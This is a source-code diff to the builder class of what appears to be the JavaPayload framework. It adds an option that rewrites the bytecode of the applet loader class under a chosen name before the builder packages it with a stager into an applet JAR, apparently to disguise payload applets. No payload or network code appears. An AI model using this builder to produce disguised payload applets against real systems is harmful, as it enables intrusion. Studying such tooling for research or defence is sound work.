@@ -36,16 +36,51 @@ package javapayload.builder;
 
 import java.util.jar.Manifest;
 
+import javapayload.loader.DynStagerURLStreamHandler;
+
+import org.objectweb.asm.ClassAdapter;
+import org.objectweb.asm.ClassVisitor;
+import org.objectweb.asm.ClassWriter;
+import org.objectweb.asm.MethodAdapter;
+import org.objectweb.asm.MethodVisitor;
+
 public class AppletJarBuilder {
 	public static void main(String[] args) throws Exception {
 		if (args.length == 0) {
-			System.out.println("Usage: java javapayload.builder.AppletJarBuilder "+JarBuilder.ARGS_SYNTAX);
+			System.out.println("Usage: java javapayload.builder.AppletJarBuilder [--name some.java.ClassName] "+JarBuilder.ARGS_SYNTAX);
 			return;
 		}
 		final Class[] baseClasses = new Class[] {
 				javapayload.loader.AppletLoader.class,
 				javapayload.stager.Stager.class,
 		};
+		if (args[0].equals("--name")) {
+			final String className = args[1];
+			String[] newArgs = new String[args.length-2];
+			System.arraycopy(args, 2, newArgs, 0, newArgs.length);
+			args = newArgs;
+			
+			final ClassWriter cw = new ClassWriter(0);
+			final ClassVisitor renameVisitor = new ClassAdapter(cw) {
+				public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
+					super.visit(version, access, className.replace('.', '/'), signature, superName, interfaces);
+				}
+				
+				public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
+					return new MethodAdapter(super.visitMethod(access, name, desc, signature, exceptions)) {
+						public void visitMethodInsn(int opcode, String owner, String name, String desc) {
+							if (owner.equals("javapayload/loader/AppletLoader"))
+								owner = className.replace('.', '/');
+							super.visitMethodInsn(opcode, owner, name, desc);
+						}
+					};
+				}
+			};
+			ClassBuilder.visitClass(javapayload.loader.AppletLoader.class, renameVisitor, cw);
+			DynStagerURLStreamHandler ush = DynStagerURLStreamHandler.getInstance();
+			ush.addClass(className, cw.toByteArray());
+			baseClasses[0] = ush.getDynClassLoader().loadClass(className);
+		}
 		JarBuilder.buildJarFromArgs(args, "Applet", baseClasses, new Manifest(), null, null);
 	}
 }
